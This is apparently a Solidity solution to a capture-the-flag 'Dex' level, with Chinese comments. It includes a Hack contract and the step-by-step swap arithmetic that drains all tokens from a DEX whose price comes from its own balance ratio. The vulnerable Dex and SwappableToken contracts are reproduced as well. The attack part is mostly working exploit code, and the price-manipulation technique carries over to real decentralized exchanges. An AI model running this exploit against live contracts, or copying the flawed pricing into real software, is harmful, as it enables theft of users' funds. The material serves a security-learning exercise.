// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * ********* Dex.sol *********
 * *** You start with 10 token 1 and token 2.
 * *** DEX has 100 tokens each.
 * *** Goal - drain all of token 1 and token 2 from DEX.
 * 1、先token 1 换 token 2, 再 token 2 换 token 1 就能获得更多的 token 1。
 * .......token 1 | token 2
 * 10 in  | 100   | 100   |  10 out
 * 24 out |  110  |  90   |  20 in
 * 24 in  |  86   |  110  |  30 out
 * 41 out |  110  |  80   |  30 in
 * 41 in  |  69   |  110  |  65 out
 *        |  110  |  45   |
 *
 * math for last swap: 需要耗尽 token 1 的 110 个币币
 * 110 = token2 amount in * balance of token 1 / balance of token 2
 * 110 = token2 amount in * 110 / 45
 * token2 amount in = 45
 *
 * 2、步骤
 *   1）先部署 Hack 合约
 *   2）调用 Hack 合约的 pwn() 函数之前先获得 approve
 *      - 获取 IDex 的实例 --> 获取两个 token 的地址
 *      - 获取 IERC20 实例 --->批准 hack 合约spend token 1 和 token 2 （owner 通常是代币合约地址的部署者批准 hack，dex的已经在 hack合约里批准啦）
 *   3）调用 Hack 合约的 pwn() 函数
 *
 *  0xDff9eadD82fb9E477944F441D9aa23638e1fa23E
 *  token1: 0x16b551B4b1CC52321BA8AFD1D3A322Aae671005C
 *  token2: 0x5B2BFC9a2ba12AED7f0031d2b19238a6d20b1545
 *
 *
 */

// 在 Remix 部署，所以要写些接口
interface IDex {
    function token1() external view returns (address);

    function token2() external view returns (address);

    function getSwapPrice(
        address from,
        address to,
        uint256 amount
    ) external view returns (uint256);

    function swap(address from, address to, uint256 amount) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

contract Hack {
    IDex private immutable dex;
    IERC20 private immutable token1;
    IERC20 private immutable token2;

    constructor(IDex _dex) {
        dex = _dex;
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
    }

    function pwn() external {
        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);

        // 允许 Dex spend: 因为要做多次 swap, 所以直接批准最大交易量。
        token1.approve(address(dex), type(uint).max);
        token2.approve(address(dex), type(uint).max);

        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);

        dex.swap(address(token2), address(token1), 45);
        require(token1.balanceOf(address(dex)) == 0, "dex balance != 0");
    }

    function _swap(IERC20 tokenIn, IERC20 tokenOut) private {
        dex.swap(
            address(tokenIn),
            address(tokenOut),
            tokenIn.balanceOf(address(this))
        );
    }
}

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract Dex is Ownable {
    address public token1;
    address public token2;

    // 构造函数是空的，没有任何逻辑。
    constructor() {}

    // 设置两个代币的地址
    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    // 向合约中添加流动性。
    function addLiquidity(address token_address, uint amount) public onlyOwner {
        // 使用IERC20接口的transferFrom函数，从调用者的地址将指定数量的代币转移到合约地址。
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    // 代币交换。它接受三个参数：要交换的代币地址"from"、要接收的代币地址"to"和交换的数量"amount"。
    function swap(address from, address to, uint amount) public {
        // 首先检查交换的代币是否有效
        require(
            (from == token1 && to == token2) ||
                (from == token2 && to == token1),
            "Invalid tokens"
        );
        // 然后检查调用者是否拥有足够的代币进行交换
        require(
            IERC20(from).balanceOf(msg.sender) >= amount,
            "Not enough to swap"
        );
        // 计算交换的价格
        uint swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    // 计算代币交换的价格。
    // （amount * to代币的余额）/ from代币的余额
    function getSwapPrice(
        address from,
        address to,
        uint amount
    ) public view returns (uint) {
        return ((amount * IERC20(to).balanceOf(address(this))) /
            IERC20(from).balanceOf(address(this)));
    }

    // 使用SwappableToken合约的approve函数来授权某个地址（spender）可以从两个代币地址（token1和token2）中转移一定数量的代币。
    function approve(address spender, uint amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(
        address token,
        address account
    ) public view returns (uint) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(
        address dexInstance,
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) ERC20(name, symbol) {
        // "_mint"函数为合约的创建者（msg.sender）分配了初始供应量的代币。
        // "_mint"和"_dex"并不是来自于父合约的函数或变量，而是在当前合约中定义的私有变量和函数
        _mint(msg.sender, initialSupply);
        // 私有变量"_dex"，它存储了一个名为"dexInstance"的地址，这个地址代表了一个去中心化交易所 DEX 的实例。
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        // 检查owner地址是否是_dex地址
        require(owner != _dex, "InvalidApprover");
        // _approve"的函数，这个函数是从ERC20合约继承super而来的。允许spender地址从owner地址中转移指定数量的代币。
        super._approve(owner, spender, amount);
    }
}
